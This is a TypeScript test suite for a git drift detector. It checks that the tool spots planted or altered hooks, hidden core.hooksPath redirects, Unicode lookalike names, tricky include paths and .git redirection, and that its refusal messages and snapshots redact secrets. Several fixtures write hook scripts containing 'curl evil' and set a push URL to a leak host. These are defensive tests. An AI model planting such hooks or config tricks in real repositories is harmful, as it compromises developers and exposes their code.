// Copyright (c) 2026 Dylan Lambertson. All rights reserved.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { cpSync, mkdirSync, writeFileSync, appendFileSync } from "node:fs";
import { join } from "node:path";
import { acknowledgeDrift, assertDriftAllowed, classifyPath, diffSnapshots, judgeDrift } from "../src/index.js";
import { git, makeFixture, write } from "./helpers.js";

const skipWin = process.platform === "win32";

test("B1: a flood of settings cannot hide core.hooksPath, and a cap on settings blocks", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    appendFileSync(join(f.common, "config"), `[alias]\n${Array.from({ length: 150 }, (_, i) => `\ta${i} = status\n`).join("")}`);
    git(f.wt, "config", "core.hooksPath", "tools/hooks");
    mkdirSync(join(f.wt, "tools", "hooks"), { recursive: true });
    write(join(f.wt, "tools", "hooks", "pre-commit"), "#!/bin/sh\ntrue\n", 0o755);
    const cur = await f.snap();
    const v = judgeDrift({ baseline: base, current: cur });
    assert.equal(v.status, "unacknowledged");
    assert.ok(v.diff.flags.some((x) => x.includes("core.hookspath")), "the hooksPath flag survives 150 alias flags");
    assert.ok(cur.entries.some((e) => e.id.endsWith("/tools/hooks/pre-commit")), "the target is hashed");
    // The user acknowledges; a later edit of the real hook directory is still seen.
    const ack = acknowledgeDrift(cur);
    write(join(f.wt, "tools", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil\n", 0o755);
    const later = await f.snap();
    assert.equal(judgeDrift({ baseline: base, current: later, acknowledgement: ack }).status, "unacknowledged");
    // Past the settings cap the snapshot cannot list everything: it blocks and cannot be acknowledged.
    const capped = await f.snap({ maxSettings: 50 });
    assert.ok(capped.incomplete.some((i) => i.blocking && i.id === "settings"));
    assert.equal(judgeDrift({ baseline: capped, current: capped }).status, "refused");
    // The hooksPath target was resolved before the cap, by key.
    assert.ok(capped.entries.some((e) => e.id.endsWith("/tools/hooks/pre-commit")));
  } finally {
    f.cleanup();
  }
});

test("B2: a form feed at the end of core.hooksPath names a different directory, and it is the one hashed", { skip: skipWin }, async () => {
  const f = makeFixture();
  try {
    appendFileSync(join(f.common, "config"), "[core]\n\thooksPath = .husky\f\n");
    mkdirSync(join(f.wt, ".husky\f"));
    write(join(f.wt, ".husky\f", "lib"), "one\n");
    const base = await f.snap();
    assert.equal(base.incomplete.length, 0, JSON.stringify(base.incomplete));
    write(join(f.wt, ".husky\f", "pre-commit"), "#!/bin/sh\necho planted\n", 0o755);
    assert.equal(judgeDrift({ baseline: base, current: await f.snap() }).status, "unacknowledged");
  } finally {
    f.cleanup();
  }
});

test("B3: a hooksPath or a hook-directory name that is not UTF-8 is unread, never a different file", { skip: skipWin }, async () => {
  const f = makeFixture();
  try {
    const name = Buffer.from([0x68, 0xff]);
    try {
      mkdirSync(Buffer.concat([Buffer.from(f.wt + "/"), name]));
    } catch {
      // This file system refuses names that are not UTF-8 (APFS): the attack cannot be staged here, and
      // the config-value half below still runs.
    }
    appendFileSync(join(f.common, "config"), Buffer.concat([Buffer.from("[core]\n\thooksPath = "), name, Buffer.from("\n")]));
    const s = await f.snap();
    assert.ok(s.incomplete.some((i) => i.blocking), "the undecodable path blocks");
    assert.equal(judgeDrift({ baseline: s, current: s }).status, "refused");
    // A file named with a non-UTF-8 byte inside an in-tree hook directory is reported unread, not as missing.
    const g = makeFixture();
    try {
      mkdirSync(join(g.wt, ".husky"));
      let staged = true;
      try {
        writeFileSync(Buffer.concat([Buffer.from(join(g.wt, ".husky") + "/lib"), Buffer.from([0xff])]), "x");
      } catch {
        staged = false;
      }
      if (staged) {
        const t = await g.snap();
        assert.ok(t.incomplete.some((i) => i.blocking && i.id.includes("hex:")), JSON.stringify(t.incomplete));
      }
    } finally {
      g.cleanup();
    }
  } finally {
    f.cleanup();
  }
});

test("B4: an include path that ends in a backslash at the end of the file is still followed", async () => {
  const f = makeFixture();
  try {
    const inc = join(f.wt, "cfg", "x");
    mkdirSync(join(f.wt, "cfg"));
    write(inc, "[core]\n\tfsmonitor = false\n");
    appendFileSync(join(f.common, "config"), `[include]\n\tpath = ${inc}\\`);
    const base = await f.snap();
    // Whatever the parser made of the line, git read the file, so it is hashed, and the snapshot is never clean over a doubt.
    assert.ok(base.entries.some((e) => e.id === `include:${inc}`), "git's include is hashed");
    write(inc, "[core]\n\thooksPath = hk\n");
    mkdirSync(join(f.wt, "hk"));
    write(join(f.wt, "hk", "pre-commit"), "#!/bin/sh\n", 0o755);
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.notEqual(v.status, "clean");
    assert.notEqual(v.status, "acknowledged");
  } finally {
    f.cleanup();
  }
});

test("B4: a line the parser rejects makes the snapshot incomplete", async () => {
  const f = makeFixture();
  try {
    appendFileSync(join(f.common, "config"), "[a b]\n\tk = v\n");
    const s = await f.snap();
    assert.ok(s.incomplete.some((i) => i.blocking && i.id === "config"));
    assert.equal(judgeDrift({ baseline: s, current: s }).status, "refused");
  } finally {
    f.cleanup();
  }
});

test("S1: a .git file with a trailing space that redirects to another repository is a mismatch", { skip: skipWin }, async () => {
  const f = makeFixture();
  try {
    const other = join(f.root, "other");
    mkdirSync(other);
    git(other, "init", "-q", "--bare");
    const wts = join(f.common, "worktrees");
    const name = execFileSync("ls", [wts], { encoding: "utf8" }).trim();
    cpSync(join(wts, name), join(wts, `${name} `), { recursive: true });
    write(join(wts, `${name} `, "commondir"), `${other}\n`);
    const before = await f.snap();
    assert.equal(before.link.mismatch, false);
    write(join(f.wt, ".git"), `gitdir: ${join(wts, name)} \n`);
    const cur = await f.snap({}, { expectedGitDir: join(wts, name) });
    assert.equal(cur.link.mismatch, true);
    assert.equal(judgeDrift({ baseline: before, current: cur }).status, "refused");
  } finally {
    f.cleanup();
  }
});

test("S3: a hook dispatcher's subdirectory under hooks/ is walked", async () => {
  const f = makeFixture();
  try {
    const d = join(f.common, "hooks", "pre-commit.d");
    mkdirSync(d);
    write(join(d, "a"), "#!/bin/sh\ntrue\n", 0o755);
    const base = await f.snap();
    write(join(d, "a"), "#!/bin/sh\ncurl evil\n", 0o755);
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v.status, "unacknowledged");
    assert.ok(v.diff.changes.some((c) => c.id === "hooks/pre-commit.d/a"));
  } finally {
    f.cleanup();
  }
});

test("S2, S4: dotless i, script g, short names with a dash, and the added entries", () => {
  const dotless = String.fromCodePoint(0x131);
  const script = String.fromCodePoint(0x261);
  const kelvin = String.fromCodePoint(0x212a);
  assert.equal(classifyPath(`.g${dotless}thub/workflows/x`)?.category, "ci");
  assert.equal(classifyPath(`.${script}ithub/workflows/x`)?.category, "ci");
  assert.equal(classifyPath(`MA${kelvin}EFILE`)?.category, "build-script", "the Kelvin sign folds to k");
  assert.equal(classifyPath(`.husk${dotless}`), null, "a lookalike that is not part of a protected name stays unmatched");
  assert.equal(classifyPath("PRE-CO~1.YAM")?.category, "git-hooks");
  assert.equal(classifyPath("AZURE-~1.YML")?.category, "ci");
  for (const p of ["conftest.py", "tests/conftest.py", "build.rs", "pyproject.toml", ".yarn/plugins/x.cjs"]) assert.notEqual(classifyPath(p), null, p);
  assert.equal(classifyPath("tools/x/y", { extraPaths: ["tools/x"] })?.category, "caller-defined");
  assert.equal(classifyPath("tools/xy", { extraPaths: ["tools/x"] }), null);
});

test("S6: the refusal names no file, path or setting", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    write(join(f.common, "hooks", "planted-name-7"), "#!/bin/sh\n", 0o755);
    git(f.wt, "config", "remote.origin.pushurl", "https://leak-host.invalid/o/r.git");
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    let text = "";
    try {
      assertDriftAllowed(v, "push");
    } catch (e) {
      text = (e as Error).message;
    }
    assert.match(text, /^push refused: /);
    assert.ok(!text.includes("planted-name-7") && !text.includes("leak-host") && !text.includes(f.root), text);
    assert.ok(v.diff.flags.some((x) => x.includes("planted-name-7")), "the structured verdict still names it");
  } finally {
    f.cleanup();
  }
});

test("nits: short userinfo tokens and secret-named lines in file text are redacted", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    git(f.wt, "config", "remote.origin.url", "https://plainuser7@example.invalid/o/r.git");
    appendFileSync(join(f.common, "config"), '[http "https://example.invalid/"]\n\textraheader = X-Auth sekritword\n');
    const cur = await f.snap();
    const blob = JSON.stringify([diffSnapshots(base, cur), cur]);
    assert.ok(!blob.includes("plainuser7"), "userinfo leaked");
    assert.ok(!blob.includes("sekritword"), "secret-named line leaked");
  } finally {
    f.cleanup();
  }
});

// Each of these pins one check by name: removing the check fails the test.

test("S5: .husky and .githooks are watched without any core.hooksPath", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    mkdirSync(join(f.wt, ".husky"));
    write(join(f.wt, ".husky", "pre-commit"), "#!/bin/sh\ntrue\n", 0o755);
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v.status, "unacknowledged");
    assert.ok(v.diff.changes.some((c) => c.id === "intree:.husky/pre-commit"));
    const w = await f.snap();
    write(join(f.wt, ".husky", "pre-commit"), "#!/bin/sh\ncurl evil\n", 0o755);
    assert.equal(judgeDrift({ baseline: w, current: await f.snap() }).status, "unacknowledged");
  } finally {
    f.cleanup();
  }
});

test("S5: a hook directory deeper than the walk limit is incomplete", async () => {
  const f = makeFixture();
  try {
    mkdirSync(join(f.wt, ".githooks", "a", "b", "c"), { recursive: true });
    const s = await f.snap({ maxWalkDepth: 2 });
    assert.ok(s.incomplete.some((i) => i.blocking && i.reason === "directory below the depth limit"), JSON.stringify(s.incomplete));
  } finally {
    f.cleanup();
  }
});

test("S5: a path setting that git must expand is unresolved and blocks", async () => {
  const f = makeFixture();
  try {
    appendFileSync(join(f.common, "config"), "[core]\n\thooksPath = ~nobody/hooks\n");
    const s = await f.snap();
    assert.ok(s.incomplete.some((i) => i.blocking && /needs git to expand/.test(i.reason)), JSON.stringify(s.incomplete));
    assert.equal(s.settings.find((x) => x.label === "core.hooksPath")?.note, "unresolved");
  } finally {
    f.cleanup();
  }
});

test("S5: an include chain deeper than the limit blocks", async () => {
  const f = makeFixture();
  try {
    const chain = [0, 1, 2, 3].map((i) => join(f.root, `i${i}.cfg`));
    chain.forEach((p, i) => write(p, i < 3 ? `[include]\n\tpath = ${chain[i + 1]}\n` : "[core]\n\tfsmonitor = false\n"));
    appendFileSync(join(f.common, "config"), `[include]\n\tpath = ${chain[0]}\n`);
    const s = await f.snap({ maxIncludeDepth: 2 });
    assert.ok(s.incomplete.some((i) => i.blocking && i.reason === "include depth limit"), JSON.stringify(s.incomplete));
    const t = await f.snap({ maxIncludeFiles: 2 });
    assert.ok(t.incomplete.some((i) => i.blocking && i.reason === "include file limit"), JSON.stringify(t.incomplete));
  } finally {
    f.cleanup();
  }
});

test("S5: a config with more entries than the parser keeps blocks", async () => {
  const f = makeFixture();
  try {
    appendFileSync(join(f.common, "config"), `[a]\n${"\tk = v\n".repeat(60)}`);
    const s = await f.snap({ maxSettings: 2 });
    assert.ok(s.incomplete.some((i) => i.blocking && i.reason === "too many entries to parse"), JSON.stringify(s.incomplete));
  } finally {
    f.cleanup();
  }
});

test("S5: when the parser and git read a file differently, the snapshot blocks", async () => {
  const f = makeFixture();
  try {
    // git cuts a value at a NUL byte; the parser does not. The disagreement is the point, whichever is right.
    appendFileSync(join(f.common, "config"), Buffer.concat([Buffer.from("[core]\n\tfsmonitor = a"), Buffer.from([0]), Buffer.from("b\n")]));
    const s = await f.snap();
    assert.ok(s.incomplete.some((i) => i.blocking && i.reason === "parser and git disagree"), JSON.stringify(s.incomplete));
    assert.equal(judgeDrift({ baseline: s, current: s }).status, "refused");
  } finally {
    f.cleanup();
  }
});
